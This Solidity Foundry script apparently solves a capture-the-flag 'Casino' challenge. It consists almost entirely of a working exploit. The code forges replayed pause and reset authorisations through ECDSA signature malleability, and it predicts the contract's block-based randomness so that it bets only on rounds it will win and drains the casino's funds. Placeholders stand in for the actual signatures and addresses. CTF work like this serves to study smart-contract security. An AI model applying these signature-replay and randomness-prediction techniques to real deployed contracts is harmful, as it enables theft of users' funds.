pragma solidity 0.8.28;

import "../src/Challenge.sol";
import {ECDSA} from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import "forge-std/Script.sol";

contract Attack {
    Challenge private challenge;
    Casino private casino;

    constructor(Challenge _challenge, Casino _casino) public payable {
        challenge = _challenge;
        casino = _casino;
    }

    function malleability(bytes memory signature) internal pure returns(bytes memory) {
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := mload(add(signature, 32))
            s := mload(add(signature, 64))
            v := byte(0, mload(add(signature, 96)))
        }
        s |= bytes32((uint256(v) % 27) << 255);
        return abi.encodePacked(r, s);
    }

    receive() external payable {
        console.log("Received:\t", msg.value);
    }

    function attack() external payable {
        console.log("============ INITIAL STATE ===============");
        console.log("PLAYER funds:\t", address(challenge.PLAYER()).balance / 1e18);
        console.log("CASINO funds:\t", address(challenge.CASINO()).balance / 1e18);

        bytes memory origSignature = hex"<ORIGINAL DEPLOYER SIGNATURE FOR PAUSE>";
        bytes memory newSignature = malleability(origSignature);
        console.logBytes(newSignature);

        casino.pause(newSignature, 0x5365718353c0589dc12370fcad71d2e7eb4dcb557cfbea5abb41fb9d4a9ffd3a);
        casino.deposit{value: 0.9 ether}(address(this));

        console.log("============ DEPOSIT ===============");
        console.log("PLAYER funds:\t", casino.balances(address(this)) / 1e18);
        console.log("CASINO funds:\t", address(challenge.CASINO()).balance / 1e18);

        uint256 targetBalance = uint256(int256(-99.9 ether - 1 wei));
        console.log("Target balance:\t", targetBalance);
        
        while (casino.balances(address(this)) < targetBalance) {
            uint256 random = uint256(keccak256(abi.encode(49_479, block.number, casino.totalBets())));
            if (random % 2 != 1) {
                casino.bet{gas: 50_000}(0);
                continue;
            }

            uint256 bet = casino.balances(address(this));
            if (bet > targetBalance - bet) { bet = targetBalance - bet; }
            casino.bet{gas: 50_000}(bet);

            console.log("============ BET ===============");
            console.log("PLAYER funds:\t", casino.balances(address(this)) / 1e18);
            console.log("CASINO funds:\t", address(challenge.CASINO()).balance / 1e18);
        }

        origSignature = hex"<ORIGINAL DEPLOYER SIGNATURE FOR RESET>";
        newSignature = malleability(origSignature);
        casino.reset(newSignature, payable(<ORIGINAL SYSTEM ADDRESS FROM SIGNATURE>), 1 ether, 0x7867dc2b606f63c4ad88af7e48c7b934255163b45fb275880b4b451fa5d25e1b);
        
        console.log("============ RESET ===============");
        console.log("PLAYER funds:\t", address(challenge.PLAYER()).balance / 1e18);
        console.log("CASINO funds:\t", address(challenge.CASINO()).balance / 1e18);
    }
}

contract Solution is Script {
    Challenge public challenge = Challenge(<CHALLENGE_ADDRESS>);
    Casino public casino = Casino(challenge.CASINO());

    function run() external{
        vm.startBroadcast(<PLAYER_ADDRESS>);
        new Attack{value: 0.9 ether}(challenge, casino).attack();
        vm.stopBroadcast();

        console.log("address(PLAYER).balance", address(challenge.PLAYER()).balance);
        console.log("address(CASINO).balance", address(challenge.CASINO()).balance);

        require(challenge.isSolved(), "Not solved!");
    }
}